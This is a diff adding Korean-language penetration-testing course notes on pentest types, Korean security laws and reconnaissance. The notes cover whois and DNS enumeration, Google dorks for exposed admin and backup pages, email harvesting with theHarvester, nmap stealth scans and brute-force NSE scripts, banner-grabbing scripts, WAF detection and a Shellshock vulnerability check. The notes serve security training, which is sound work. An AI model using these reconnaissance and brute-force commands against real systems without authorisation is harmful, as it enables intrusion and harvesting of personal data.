@@ -1,0 +1,1335 @@
+
+
+==================================모의해킹==================================
+
+
+
+================시스템 모의해킹 진단 절차와 범위============================
+
+1. 모의해킹 개요
+	모의해킹   = pentest 라 함, 이 3개는 같은 단어 
+	모의진단   = 한국에서는 모의진단이 취약성진단
+	침투테스트 = 침투테스트는 전문가들이 하는것 특정 취약점에대해 엄청난 공격함
+	
+	정의 : 실제환경과 유사한 곳에 하는것 서로 동의가 필요
+	
+	목적 : 취약점 분석
+	
+	대상 : 회사내의 모든 서비스 
+	
+	효과 : 기밀성 (C)
+				인증 : 아이디+PASSWORD
+				인가 : 인증을 통해 들어온 사람이 어느정도 권한을 가지는지 판단하는것 
+	       무결성 (I)
+	 			변형이나 변조가 되어지지 않는것을 서비스 하는것 
+	       가용성 (A)
+				계속 사용이 가능하게 해야 한다.
+	
+	모의해킹 테스트 분류	
+		블라인드 테스트     : 공격자에게 정보를 제공하지 않음 일주일 주고 공격함
+		더블블라인드 테스트 : 정보도 제공을 안하고 검사대상도 말 안함 그냥 분기에 정해 놓고 언제든지 공격을 진행
+		그레이 박스 테스트  : 가벼운정보를 제공하고 해당 정보에 공격
+		더블 그레이 테스트  : 정보를 조금 제공하지만 통보를 하지는 않는다.
+		탠덤 테스트         : 모든 정보를 가지고 검사 대상에 통보하고 수행
+		리버설 테스트       : 모든 정보를 제공받지만 검사 대상에 통보안하고 수행 
+		
+		한국 : 블라인드 테스트 = 블랙박스 테스트 -> 모의해킹에서 자주 이용
+					회사외부에서 계정이 있을때와 없을때를 나눠서 공격한다.
+					회사내부에서 계정이 있을때와 없을때를 나눠서 공격한다.
+			   탠덤 테스트     = 화이트박스 테스트 -> 시큐어 코딩에 자주 이용 
+					코드를 짤때 기능 성능 보안 순이다 이렇게 다 보고 공격을 시도한다.
+	
+	
+2. 일반적인 형태의 취약점 진단 절차(모의해킹의 시나리오)
+	- 정보수집
+		대상에 대한 정보를 수집함
+	- 취약점 수집
+		취약점 에 대한 정보를 수집
+	- 침투단계
+		침투 가능성 있는지 테스트
+	- 상세분석
+		침투할때 영향을 줄수있는지 분석하는 단계
+	- 보고서 작성
+		도출된 취약점에 대한 보고서 작성
+
+		
+3. 시스템 취약점 진단 절차와 범위 
+	1. 서버 취약점 점검 ( 리눅스는 쉘 스크립트 / 윈도우는 배치 스크립트 )
+		- 리눅스,유닉스,윈도우 등등
+	
+	2. 네트워크 취약점 점검
+		- 물리적인 접근을 해서 오류가 있을 수 있기 때문에 체크리시트 형식으로 사용
+		- false positive(오탐) 최소화 해야함
+	
+	3. 정보보호시스템 취약점 점검
+		- 정보보호시스템 = 보안장비 (방화벽, IPS, IDS 등등)
+		- 자체 개발 스크립트를 활용하기 힘듬 너무 많아서 따라서 실습하면서 점검해보기 
+	
+	4. WAS/DB 취약점 점검
+		- WAS = Web Applecation Server 
+			: 스크립트로 어려움 직접해보는것 추천 (전문적으로 하면 모의해킹 간단하게는 웹취약점 점검)
+	
+4. 모의해킹 절차와 범위(안랩기준)
+		
+	1.모의해킹
+		1. 수행전
+			- 대상 범위 선정
+		2. 모의침투
+			- 정보 수집
+			- 목록화
+			- 취약점 분석
+			- 공격 시도
+			- 결과분석
+		3. 수행후 
+			- 대응방안 마련
+			- 보고서 작성
+			- 흔적제거
+	
+	2. 웹 모의해킹 진단범위 : 웹은 툴을 돌리면 부하량이 심해서 수동으로 점검을 하게 함
+		1. 사용자 인증
+		2. 사용자 세션 관리
+		3. 암호화 및 전송 보안
+		4. 접근제어 및 권한
+		5. 데이터 유효성
+		6. 웹취약점
+		7. 사용자 개인정보보호
+		8. 정보노출
+		9. 권한획득 등
+		
+[참고]
+ex) url에 id와 passwd부분에 뭘 넣었을때 그대로 db에서 오류가 나오는거보면 취약하다고 함 
+취약하다 취약하지 않다를 진단 = 취약점 진단
+취약점이 있으면 이를 이용해 공격하는것 = exploit
+
+1. 크롤링을 함
+	뭐 밑에 뭐가 있고 뭐밑에 뭐가있는지 보는작업
+	
+2. 공격함(서버에 리퀘스트)
+	코드들(sql인젝션test, xss test, 등등) 을 해당 크롤링 작업한 곳에 한번씩 넣어봄
+	
+3. 이렇게 하면 서버가 다운될 수 있음 엄청난 리퀘스트가 있기 때문에 
+
+4. 따라서 위에 있는 코드들을 가지고 딜레이 타임을 줘서 천천히 보내면 가장 좋음
+
+
+
+
+================취약점 점검에 대한 규정하는 법률============================
+
+1. 보안 관련 법 확인
+	정보보호컨설팅은 항상 이 사이트에 들어가서 법이 바뀐것을 확인해야 한다.
+	http://cyberbureau.police.go.kr/share/subnew.jsp
+
+2. 정보보안 관련 법률 및 국내/외 제도
+	- 중견기업 급 이상은 항상 취약점 점검을 수행 받아야함 
+	
+    1. 정보통신기반보호법
+		제9조 (취약점의 분석/평가) :  
+			- [취약점 분석/평가]는 453개의 관리적/물리적/기술적 점검
+			- 6개월 이내에 취약점 분석/평가
+			- 매년 정기적으로 취약점 분석/평가
+		
+    2. 정보통신법 이용촉진 및 정보보호 등에 관한 법률
+		제47조(이용자의 정보보호)
+		
+    3. 전자금융감독규정
+		제21조3(전자금융기반시설의 취약점 분석/평가)
+		제11조4(전자금융기반시설 취약점 분석/평가의 내용)
+		제11조5(전자금융기반시설 취약점 분석/평가의 절차 및 방법 등)
+		
+    4. 정보보호관리체계(ISMS)
+		위험관리 방법 및 계획에 따라 정보보호 전 영역에 대한 위험 식별 및 평가를 연1회 이상 수행하고 그 결과에 따라 조직에서 수용 가능한 위험수준을 설정하여 관리
+    
+	5. ISMS
+		ISO27001 에 기반해 한국에 맞게 만든 것 
+	
+
+
+
+
+================정보 수집============================
+
+1. 정보 수집 개요
+	
+	정보 : 의미있는 data 
+	
+	정보 수집 :
+		
+		- 풋 프린팅     : 시스템의 정보를 모으는 방법들 
+		
+		- 패시브 스캐닝 : 중간에 왔다 갔다 하는 정보를 수집하는 것 (와이어샤크)
+			# yum list "whois*"
+			# yum -y install whois
+			# whois ubuntuforms.org 		dns질의
+			# dig ubuntuforums.org			dns질의
+			# which nc						명령어 찾기
+			# nc -v ubuntuforums.org 80		get쳤을때 베드리퀘스트 뜨면서 상대 서버 정보를 조금 볼수 있다
+			(구글)
+				inurl:admin site:co.kr intext:admin filetype:pdf	검색할때 url에 admin과 사이트는co.kr과 텍스트에 admin들어가고 파일타입이pdf
+				intitile:"아파치 설치를 위한 테스트 페이지"			타이틀이 ""안에 있는것이 들어가잇고 들어가면 기본사이트가 있다 이는 취약함을 표시함
+				site:co.kr intext:"index of/"						디렉토리를 목록화 한다
+				intitle:"index of/" intext:"(backup|백업|bak|dump)" 로그파일을 검색한다.
+		
+		- 액티브 스캐닝 : 상대편을 선정 후 nmap툴을 이용해 스캔
+			
+	정보 수집 과정의 종류
+		
+		1. 인터넷 활용
+			- 인터넷(정보보안사이트)을 통해 정보를 확인하는 방법(EX: exploit-db.com)
+			- 구글 검색을 통해 정보를 확인하는 방법(EX: 구글해킹(GHDB))
+		
+		2. DNS 서버를 사용하는 경우(EX: dnsenum)
+		
+		3. 사회공학적인 기법(Social Engineering)을 사용하는 경우(EX: SET)
+		
+		4. 스캐너를 사용하는 방법
+			- 일반 스캐너를 사용하는 방법(EX: nmap/zenmap)
+			- 취약점 스캐너를 사용하는 방법(EX: Nessus/OpenVAS/Nexpose)
+
+
+2. 인터넷(정보보안사이트)을 이용한 보안정보 확인 방법
+
+	정보보안 사이트를 통해 정볼르 확인하는 방법
+		● https://www.exploit-db.com/									국외
+			- 해킹 코드들을 볼 수 있는 사이트
+			- 왼쪽에 exploit 는 실행시키면 공격이 되는것 페이로드포함
+		● https://www.krcert.or.kr/main.do								국내
+		● http://www.owasp.org/index.php/Main_Page						인터넷 -> 보안뉴스
+		● http://www.metasploit.com
+		
+	[실습] 배시쉘 버그 관련 정보 확인
+		
+		용어 
+			- 배시쉘 버그 = 쉘쇽
+			- 제로데이어택
+			- CAPTCHA - 사람인지 컴퓨터인지 확인 하는 것 
+			- reCAPTCHA - 보안적으로 캡챠보다 더욱 강함(EX : 산을선택하시오)
+		
+		함수정의
+			# a() {
+				> date;
+				> cal;
+				}
+			# a				함수 실행
+			# typeset -f	함수 확인
+			# unset -f a	함수 지우기 
+		
+			$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
+				- 변수 안에 함수가 들어 갈 수 있음 
+				- 함수이름 : 없음
+				- env는 환경변수 따라서 x가 변수
+				- x에 뒤에있는것들이 들어가는 것 x에 함수가 들어갈 수 있음 
+				- : 는 아무것도 안하는 것을 말함
+				- vulnerable 까지가 실행되고 뒤에 bash에 명령어로 들어가는것 
+				
+				[참고]
+					# cal과 #bash -c cal의 차이
+					# cal     	  -> 기본 bash에서 똑같은 bash생성후 cal치는것 여기는 만약 기본이 본쉘이면 본쉘로 생성됨
+					# bash -c cal -> 현재쉘이 무슨 쉘이여도 배쉬쉘로 cal을 실행하는것 이거는 무슨쉘이던 배쉬쉘로 할수 있음 이렇게 해서 공격을 하는것 쉘을 바꿔서 
+			
+			# export LANG=ko_KR.UTF-8 ; system-config-network-gui 계속 한글로 유지됨 gui을 꺼도
+			# env LANG=ko_KR.UTF-8 system-config-network-gui	  이거는 gui실행할때만 한글로 실행하고 끄면 영어로 바뀜 
+		
+	
+	[실습] 배시쉘 버그 존재 유뮤 확인
+		# env x='() { :;}; echo vulnerable' bash -c "echo this is a test" 
+			-> 실행 후 vulnerable 가 뜨는지 확인 그럼 취약
+		# yum repolist
+		# vi /etc/yum.repos.d/CentOS-Base.repo 	-> 에서 http://vault.centos.org/5.11/ 이걸로 설정
+		# bash --version 	-> 3.2.25 버전 확인
+		# rpm -qa | grep bash	-> 3.2-24 버전 확인
+		# yum -y install bash	-> 버전 업데이트
+		# bash --version		-> 버전이 그대로다? 표시가 안됨
+		# rpm -qa | grep bash	-> 버전 바뀜 3.2.33 으로
+		# env x='() { :;}; echo vulnerable' bash -c "echo this is a test"	-> vulnerable 가 표시안됨 안전!
+	
+		[결과]
+			bash-3.2-32.el5_9.1 이하 버전 : 배시쉘 버그 존재
+			bash-3.2-33.el5_9.1 이상 버전 : 배시쉘 버그 패치
+	
+	[실습] 배시쉘 버그 공격 실습
+		(칼리)
+		(리눅스206)
+		
+	[참고] CVE CWE
+		프로그램은 CWE
+		벤더는 CVE에 해당
+	
+	
+3. DNS 서버를 사용한 정보 수집
+	
+	말테고 - 검색엔진을 통해 정보를 수집한다 (이메일정보)
+	theharvest - 검색엔진을 통해 정보를 수집한다 (이메일정보)
+
+	수집이유 :
+		대상 서버의 네트워크 디자인 구성 확인
+		nslookup, dig, host 등을 사용 
+		[한번에 검색] 
+			● dnsenum CMD
+			● dnsmap CMD
+			● dnswalk CMD
+	
+	[실습] 구글맵과 후이즈 데이터베이스를 사용한 정보 수집
+		(원본)
+			nslookup www.soldesk.com				-> 211.40.118.45
+			https://whois.kisa.or.kr/kor/main.jsp   -> 접속
+			211.40.118.45							-> 들어가기 
+			후이즈검색.한국							-> 에는 ip주소 추적에 관한 오해라는 아이콘이 있다! 읽기!
+		(리눅스200)
+			# whois 211.40.118.45					-> 위랑 같음
+		(원본)
+			www.ipconfig.kr							-> 위치 확인할수있음
+	
+	[실습] 구글맵/스트리트 뷰 
+		타겟 : 74.125.103.163 (구글 LLC)
+		(원본)
+			https://www.ipinfodb.com				-> 들어가서 중간 정도에 74.125.103.163 검색
+			위도와 경도 찾기						-> 도시의 좌표라고 해서 표시된 곳 (37.405992, -122.078515)
+			www.google.co.kr/maps					-> 좌표검색 
+			
+	[실습] dig 명령어를 통한 도메인 정보 확인
+		# dig @8.8.8.8 soldesk.com {ANY|MX|NS|A|PTR}
+		# dig @168.126.63.1 seoul.ac.kr {ANY|MX|NS|A|PTR}
+		
+	[실습] dnsenum 명령어를 사용한 도메인 정보 수집	-> 검색엔진을 이용함
+		# dnsenum google.com
+			Trying Zone Transfers and getting Bind Versions:
+			_________________________________________________
+			Trying Zone Transfer for google.com on ns4.google.com ... 
+			AXFR record query failed: corrupt packet					-> AXFR 은 내가 슬레이브 DNS 서버니깐 정보를 달라 -> 보안때문에 막혀있는것 
+
+		# dnsenum --dnsserver 8.8.8.8 --enum --noreverse -f /usr/share/dnsenum/dns.txt google.com 
+			사전파일로 검색 조짐 
+		
+	[실습] dnsmap 명령어를 이용한 도메인 정보 수집 -> dns에 질의하는툴임
+		# dnsmap google.com 
+			dnsmap을 실행하면 사전 파일에 있는 문자열과 도메인을 비교한다.
+				-> 비교한 결과 내용은 순서대로 DNS 쿼리를 요청하여 응답이 오는 내용에 대해서만 IP와 같이 출력한다.
+				-> 출력된 결과는 현재 등록된 도메인과 하위 도메인이다. 
+		# dnsmap seoul.ac.kr
+
+	[실습] theharvester 명령어를 사용한 이메일 정보 수집
+		(칼리)
+			# theharvester
+			# theharvester -d soldesk.com -l 500 -b google 	구글을 이용해서 솔데스크를 500페이지 정도를 검색해서 이메일 정보를 수집 
+			# theharvester -d soldesk.com -l 500 -b all		모든 검색엔진을 이용해서 솔데스크를 500페이지 정도를 검색해서 이메일 정보를 수집 이러한 것을 크롤링이라함 응답이 있는것을 돌려받는것 
+			
+	[참고] 소스코드 다운로드 받는 사이트
+		- code.google.com
+		- GitHub.com
+		- sourceforge
+	
+	[실습] dnsmap.sh 개발하기
+		(칼리)
+			# mkdir -p /root/bin && cd /root/bin 
+			# cat << EOF >> dns.txt 
+				www
+				ftp
+				mail
+				ns
+				ns1
+				aaaaaa
+				EOF
+			# gedit dnsmap.sh &
+				#!/bin/bash
+				
+				if [ $# -ne 1 ] ; then
+					echo "Usage: $0 <domain name>"
+					exit 1
+				
+				fi
+				DomainName=$1
+				FileName=/root/bin/dns.txt
+				CMD=/usr/bin/nslookup
+				Tmp1=/tmp/tmp1
+				
+				for i in $(cat $FileName)
+				do
+					$CMD $i.$DomainName 8.8.8.8 > $Tmp1 2>&1
+					fgrep -q "can't find" $Tmp1
+					if [ $? -ne 0 ] ; then
+						echo "========================="
+						echo "[+]$i.$DomainName"
+						echo "========================="
+						cat $Tmp1 | sed '1,3d'
+						echo "========================="
+						echo
+					else
+						echo "[-]$i.$DomainName"
+					fi
+				done
+				
+			# chmod 700 /root/bin/*.sh
+			# ./dnsmap.sh soldesk.com
+			
+			
+4. 스캐너를 사용한 정보 수집
+	
+	용어
+		풋프린팅 : 공격 대상의 정보를 모으는 방법
+		사회공학 : 기술적인 해킹이 아닌 개인적인 인간관계를 이용한 방법
+	
+	스캐닝 종류
+		스캔       : 서비스 제공과 서비스 확인 (ex : nmap, nessus, nexpose, openVAS)
+		ICMP스캔   : ping을 해서 서버가 살아있는지 죽어있는지 확인
+		서비스스캔 : 특정 앱이 동작하는경우 구동되는 포트가 있기 때문에 스캔하는것 
+		
+	스캐닝 도구의 종류
+		
+		스캔 범위에 의한 스캐닝 도구의 종류
+		
+			시스템 진단 도구     : Lynis, linux-exploit-suggester
+
+			네트워크 스캐닝 도구 : nmap, nessus
+
+			전문 스캐닝 도구     : 위에는 전체적으로 검사 이거는 취약점에 전용으로 스캔하는것 
+				- DB 스캐닝 도구 (SQLmap)
+				- 방화벽 룰셋 도구 (hping3)
+				- 웹 서버 취약점 도구 (nikito, paros)
+				- 소스 코드 취약점 도구 (yasca, trinitysoft Code-Ray XG)
+		
+		취약점 진단 유무에 의한 스캐닝 도구의 종류
+			일반적인 스캐너- 서비스 포트 open/close 유무 확인과 프로그램 종류 및 버전 확인
+			취약점 스캐너- 서비스 포트에 대한 프로그램 종류와 버전 확인 뿐만아니라 각 서비스에 대한 취약점까지 점검하는 툴
+				
+		취약점 점검 및 모의 해킹 예제
+			(ㄱ) 시스템 진단 도구(각 서버에script 실행)				-> 컨설턴트처럼 스크립트로 작성 
+			(ㄴ) 네트워크 스캐닝 도구(취약점 통합 진단 도구(nessus))
+			(ㄷ) 전문 스캐닝 도구(취약점 개별 진단 도구(DB, WEB))	
+			(ㄹ) 개인적으로 진단									-> 리퀰스트가 많아 서버에 부하가 많아서 툴을 못돌리는 경우 이걸함
+	
+	일반적인 스캐너를 사용한 정보수집
+		nmap
+			기능이 매우 많다 하지만 레포트 기능이 떨어진다.
+			CUI : nmap
+			GUI : zenmap
+			옵션
+				-sT		TCP Open Scan
+				-sS		TCP Half Open Scan(세션을 성립시키지 않는 SYN 스캔)
+				-sF		TCP FIN Scan(FIN 패킷을 이용한 스캔)
+				-sN		TCP NULL Scan(NULL 패킷을 이용한 스캔)
+				-sX		TCP Xmas 스캔(FIN, PSH, URG 패킷을 이용한 스캔)
+				-sP		ping 이용한 호스트 활성화 여부 확인
+				-sU		UDP Port Scan
+				-A 		All
+				-O		대상 호스트의 운영체제 판별
+				-F		Fast scan
+				-sV		Service Version
+				-T		0~5 까지 스캐닝 시간 정해줌
+		
+		상대방 서버에 돌아가고있는걸 확인하고 싶다? ( 툴이없다면 )
+		telnet 192.168.20.200 25 	하면 메일서버가 열려있는지 확인 가능
+	
+		[실습] UDP 오픈 스캔 -> 스캐닝의 결과는 모두 믿으면 안된다!!! (ex:스캐닝으론 안뜨는데 그냥 들어가면 웹사이트가 들어가짐 이유는 보안장비들 때문에)
+			포트오픈 : 응답x
+			포트닫힘 : icmp unreachable
+			사용시스템 : linux200(named(53)) kaliLinux(nmap CMD)
+			시나리오 : 칼리리눅스에서 linux200 서버에 53번 포트가 Open 되어 있는지 확인
+			(칼리)
+				# 와이어샤크 기동
+				# namp -sU -p 53 192.168.20.200 
+				# 패킷 분석
+			(리눅스200)
+				# service named stop
+					53번 포트 끄기 
+			(칼리)
+				# namp -sU -p 53 192.168.20.200 
+				# 패킷분석 
+			
+		[실습] TCP 오픈 스캔 
+			포트오픈 : SYN/ACK
+			포트닫힘 : RST/ACK
+			사용시스템 : linux200(sshd(22)) kalilinux(nmap CMD)
+			시나리오 : 칼리리눅스에서 linux200 서버에 22번 포트가 Open 되어 있는지 확인
+			(칼리)
+				# 와이어샤크 기동
+				# nmap -sT -p 22 192.168.20.200
+				# 패킷분석
+			(리눅스200)
+				# service sshd stop
+					22번 포트 끄기 
+			(칼리)
+				# namp -sT -p 22 192.168.20.200 
+				# 패킷분석 
+			
+		[실습] TCP Half Open Scan (Stealth Scan)
+			특징 : 서버에 로그를 안남김 완벽하게 3핸드쉐이크를 완료 안해서
+			포트오픈 : SYN/ACK
+			포트닫힘 : RST/ACK
+			사용시스템 : linux200(telnetd(23)) kalilinux(nmap CMD)
+			시나리오 : kaliLinux(nmap CMD) ----------> linux200(telnetd(23))
+			(칼리)
+				# 와이어샤크 기동
+				# nmap -sS -p 23 192.168.20.200
+				# 패킷분석
+			(리눅스200)
+				# service telnet stop
+					23번 포트 끄기 
+			(칼리)
+				# namp -sS -p 23 192.168.20.200 
+				# 패킷분석 
+	
+		[참고] unit 구분
+			UNIT.service : Standalone 방식의 서비스
+			UNIT.socket  : xinetd 방식의 서비스 
+		
+		[실습] FIN/XMAS/NULL Scan (Stealth Scan)
+			특징 : 서버에 로그를 안남김 완벽하게 3핸드쉐이크를 완료 안해서
+			포트오픈 : SYN/ACK
+			포트닫힘 : RST/ACK
+			사용시스템 : linux200(telnetd(23)) kalilinux(nmap CMD)
+			시나리오 : kaliLinux(nmap CMD) ----------> linux200(telnetd(23))
+			(칼리)
+				# 와이어샤크 기동
+				# nmap -sF -p 21 192.168.20.200
+				# nmap -sX -p 21 192.168.20.200
+				# nmap -sN -p 21 192.168.20.200
+				# 패킷분석
+			(리눅스200)
+				# service vsftpd stop
+					21번 포트 끄기 
+			(칼리)
+				# nmap -sF -p 21 192.168.20.200
+				# nmap -sX -p 21 192.168.20.200
+				# nmap -sN -p 21 192.168.20.200
+				# 패킷분석
+		
+		[참고] 
+			# nmap -sS -sU -p 21 192.168.20.200 
+				여러가 옵션을 섞어 쓰는 것이 가능할까? 가능
+				만약 가능하다면 출력 내용은 무슨 뜻인가? udp와 tcp가 둘다 나옴 
+			# nmap -sT -sS -p 21 192.168.20.200 
+				이거는 불가능 둘다 tcp라서 
+
+		[실습] kaliLinux에서 zenmap 사용
+			(리눅스200)
+				# yum -y install namp nmap-frontend
+				# rpm -qa | egrep 'nmap'
+				# nmap &
+					위에 헬프 -> 어바웃 -> 버전확인 
+			(윈도우2008)
+				zenmap 설치 후 실행
+			(칼리)
+				# apt-get -y install nmap-common zenmap 
+				# zenmap &
+					-타겟 : 192.168.20.0/24	프로파일 : quick scan plus 로 돌리기!
+					-profile -> new profile or command -> 편집창 나옴
+						profile : 이름과 설명작성
+						scan    : 옵션과 타겟을 지정한다
+						ping    : 핑옵션 설정
+						-> 저장
+					프로파일에 위에서 저장한거 스캔가능함
+				
+		dnmap -> 분산 nmap
+			엄청 큰 회사의 네트워크 스캐닝을 할 때 사용
+			dnmap_server 를 만들어서 해당 서버에 여러컴퓨터를 붙여 한 컴퓨터당 nmap조진다
+			server는 제어만하고 컴퓨터가 정보를 제공해서 합쳐서 보여준다
+			
+			[참고] 패키지 관리 명령어 사용하는 방법에 대한 비교
+			■ (Debian 계열) Debian + Utuntu
+				# dpkg -l 
+				# dpkg -l coreutils
+				# dpkg -L coreutils		설치된 곳 확인
+				# dpkg -S /bin/ls		ls가 어디에 속한것인지 확인
+				# dpkg -s coreutils		정보를 확인
+			■ (RedHat 계열) RedHat + CentOS + Fedora
+				# rpm -qa 
+				# rpm -q coreutils
+				# rpm -ql coreutils 	설치된 곳 확인
+				# rpm -qf /bin/ls		ls가 어디에 속한것인지 확인
+				# rpm -qi coreutils		정보를 확인
+				
+		[실습] dnmap 사용하기
+			(칼리 터미널 1)
+				# mkdir -p /root/bin 
+				# cd /root/bin 
+				# vi dnmap_command.txt 
+					nmap -sS -p22 192.168.10.0/24 -v -n -oA 192.168.10.0
+					nmap -sS -p22 192.168.20.0/24 -v -n -oA 192.168.20.0
+				# dnmap_server -f dnmap_command.txt
+					-> 서버에서 대기상태로 돌아감 
+			(칼리 터미널 2)
+				# cd /test
+				# dnmap_client -h
+				# dnmap_client -s 192.168.20.50 
+					-> 에러가 나옴 
+				툴문제!
+		
+		[실습] dnmap.sh 프로그램 제작
+			(칼리)
+				# ssh-keygen
+				# cd ~/.ssh
+				# ssh-copy-id -i id_rsa.pub root@192.168.20.200		-> 공개키를 주어서 마음대로 들어갈수있음
+				# ssh 192.168.20.200
+				# mv id_rsa.pub authorized_keys						-> 칼리에서 칼리로 마음껏이동
+				# service ssh restart
+				# ssh 192.168.20.50 hostname
+			(스크립트)
+				# cd /root/bin
+				# gedit cmd.sh &
+					#!/bin/bash
+					echo "----------- KaliLinux -----------"
+					ssh 192.168.20.50 $*
+					echo
+					echo "----------- linux200  -----------"
+					ssh 192.168.20.200 $*
+					echo
+				# gedit copy.sh &
+					#!/bin/bash
+					echo "----------- KaliLinux -----------"
+					scp $1 192.168.20.50:$2
+					echo
+					echo "----------- linux200  -----------"
+					scp $1 192.168.20.200:$2
+					echo
+			(배열사용)
+				# array1=("v1" "v2" "v3")
+				# array3=(`cat /etc/hosts`)
+				# echo $array1
+					v1
+				# echo ${array1[0]}
+					v1
+				# echo ${array1[1]}
+					v2
+				# echo ${array1[2]}
+					v3
+				# echo ${array3[0]}
+					127.0.0.1
+				# echo ${array3[1]}
+					localhost
+				# echo ${array3[*]}
+					127.0.0.1 localhost 127.0.1.1 kali2.example.com kali2 # The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters
+			(프로그램제작)
+				# cd /root/bin
+				# vi nmap_CMD.txt
+					nmap -sS -p22 192.168.10.0/24 -v -n -oA 192.168.10.0
+					nmap -sS -p22 192.168.20.0/24 -v -n -oA 192.168.20.0
+					nmap -sS -p22 192.168.30.0/24 -v -n -oA 192.168.30.0
+					nmap -sS -p22 192.168.40.0/24 -v -n -oA 192.168.40.0
+				
+				# gedit dnmap.sh
+					#!/bin/bash
+
+					if [ ! -d nmap_output ] ; then
+						mkdir -p nmap_output
+					else
+						rm -rf nmap_output/*
+					fi
+					
+					NmapCmdFile=nmap_CMD.txt
+					HostFile=host.txt
+					CMDLineCount=$(wc -l < $NmapCmdFile)
+					HostLineCount=$(wc -l < $HostFile)
+					ClientIP=(`cat $HostFile`)
+					
+					START=1
+					END=$CMDLineCount
+					
+					while [ $START -le $END ] 
+					do
+						Remainder=$(expr $START % $HostLineCount)		나머지값나오게한것
+						Host=${ClientIP[$Remainder]}
+					
+						CMD=$(sed -n ${START}p $NmapCmdFile)			명령어 하나씩 뽑은것 
+						ssh $Host $CMD >> nmap_output/result.txt 		이렇게하면 포그라운드로 돌아서 병렬처리불가 따라서 한서버가 끝나고 다른서버에가는 그런 역할임 결국 똑같음 
+						START=$(expr $START + 1)						&을 줘서 백그라운드로 하면 result.txt파일 명을 각각 다른걸로 지정해줘야함 명령어 한개마다 그래야지 하나씩 들어가서 병렬처리가 가능
+					done
+					
+					cat nmap_output/result.txt
+			
+		nmap & NSE
+			(칼리)
+				# zenmap &
+					Profile > New Profile or Command > Scripting 탭 에있는것을 NSE라함
+					banner 선택후 포트와 타임아웃 값 선택가능
+				# cd /usr/share/nmap
+				# ls
+					-> nmap-os-db	  	   : nmap -O 가 운영체제 보는것인데 판별하는 기준이 들어있는 파일
+					-> nmap-protocols 	   : nmap -sV
+					-> nmap-services 	   : nmap -sV
+					-> nmap-service-probes : nmap -sV
+					-> scripts directory   : nmap-nse : nmap --scripts<script.nse>
+				# cd scripts
+				# ls -l | grep http			이렇게 쓰면 해당 목록에 대한 코드를 볼수있음 
+				# ls -l | grep telnet
+				# ls -l | grep ssh
+				# nmap --script telnet-brute.nse 192.168.20.200	사용법!
+				# nmap --script ssh-hostkey.nse 192.168.20.200	사용법!
+				# nmap --script ssh-brute.nse 192.168.20.200 -p 22 사용법!
+				# nmap -sC 192.168.20.200 	-> 기본 디폴트스크립트 스캔 
+				# vi ssh-hostkey.nse
+				# vi banner.nse	랑 gui banner랑 비교
+				# nmap --script banner.nse -p 23 192.168.20.200		배너안나옴
+				# nmap --script banner.nse -p 21 192.168.20.200		banner: 220 (vsFTPd 3.0.2)
+				# nmap --script banner.nse -p 22 192.168.20.200		banner: SSH-2.0-OpenSSH_7.4
+				# nmap --script banner.nse -p 25 192.168.20.200		banner: 220 mail.example.com ESMTP Sendmail 8.14.7/8.14.7; Wed, 4 Dec 2
+					
+			[실습] banner grabbing 실습 및 툴 제작	-> 배너를 통해 버전을 알게되면 해당 버전의 취약점을 알수있기 때문에 위험함
+				(칼리)
+					# telnet localhost 25 
+					# telnet localhost 21 
+					# telnet localhost 22 
+					# telnet localhost 23 
+				(리눅스200)
+					# lynx --head http://localhost
+					# curl --head http://localhost
+				(툴제작)
+					(banner.sh)	메인
+						#!/bin/bash
+
+						if [ $# -ne 1 ] ; then
+							echo "Usage: $0 <IP>"
+							exit 1
+						fi
+						export IP1=$1
+						
+						./banner_ftp.sh				1
+						./banner_telnet.sh			2
+						./banner_ssh.sh				3
+						./banner_smtp.sh			4
+						./banner_web.sh				5
+
+					(1)
+						#!/bin/bash
+
+						a() {
+							sleep 1; echo 'quit'
+						}
+						
+						a | telnet $IP1 21 > /tmp/tmp1 2>&1
+						echo "======ftp======"
+						cat /tmp/tmp1 | grep -i ftp
+						echo""
+					
+					(2)	
+						#!/bin/bash
+
+						a() {
+							sleep 1; echo 'quit'
+						}
+						
+						a | telnet $IP1 22 > /tmp/tmp3 2>&1
+						
+						echo "======ssh======"
+						cat /tmp/tmp3 | sed -n '4p' 
+						echo""
+						
+					(3)
+						#!/bin/bash
+
+						a() {
+							sleep 1; echo 'quit'
+						}
+
+						a | telnet $IP1 23 > /tmp/tmp2 2>&1
+
+						echo "======telnet======"
+						cat /tmp/tmp2 | sed -n '5p' 
+						echo""
+					
+					(4)
+						#!/bin/bash
+
+						a() {
+							sleep 1; echo 'quit'
+						}
+
+						a | telnet $IP1 25 > /tmp/tmp4 2>&1
+
+						echo "======smtp======"
+						cat /tmp/tmp4 | grep -i smtp
+						echo""
+					
+					(5)
+						#!/bin/bash
+
+						curl --head http://$IP1 > /tmp/tmp5 2>&1
+
+						echo "======web======"
+						cat /tmp/tmp5 | sed -n '6p' 
+						echo""
+
+		보안장비탐지
+			툴을 돌렸을때 원하는 정보가 안나오면 보안장비탐지를 해서 보안장비가 있는지를 탐지한다.
+			
+			방화벽 IPS
+			
+			IDS 
+				-Snort : port2350 번
+			
+			국내 웹 방화벽(WAF) 
+				- 펜타시큐리티시스템 : WAPPLES V2.0
+				
+			[실습] 보안장비탐지 및 탐지과정분석, 탐지 코드 분석
+				[참고] 테스트할 URL
+					www.test.com	-> WAF X
+					www.seoul.ac.kr -> WAF O
+				(칼리)
+					# wafw00f
+					# wafw00f www.test.com	-> no WAF
+					# wafw00f www.seoul.ac.kr	-> WAF있음
+					
+			[실습] 웹방화벽 탐지 방법 분석
+				(칼리)
+					# wireshark &
+					# wafw00f www.seoul.ac.kr	-
+					# wafw00f www.test.com
+				
+					두개를 분석하면 아주 쉬운 공격을 보내서 웹서버가 응답하는 것 과 웹방화벽이 응답하는 것을 확인한다 
+					판별 : 웹 방화벽이 차단할만한 쉬운 공격을 해본다!
+			
+			[실습] 웹방화벽 탐지 프로그램 코드 분석
+				빠른 코드 분석 방법 : 프로그램 실행 결과와 코드를 같이 분석하고 공격패킷을 와이어샤크를 잡아서 같이 분석한다!
+				(칼리)
+					# which wafw00f
+					# vi /usr/bin/wafw00f
+					# dpkg -S /usr/bin/wafw00f 			패키지 이름을 찾아봄
+					# dpkg -L wafw00f					패키지 파일 목록
+					# cd /usr/lib/python3/dist-packages/wafw00f		패키지 설치파일 들어감
+					# ls
+					# vi __init__.py					버전이 들어가있음
+					# vi main.py						메인문 
+					# vi wafprio.py						waf의 이름들이 들어가있음
+					# vi main.py	터미널1에서 열기
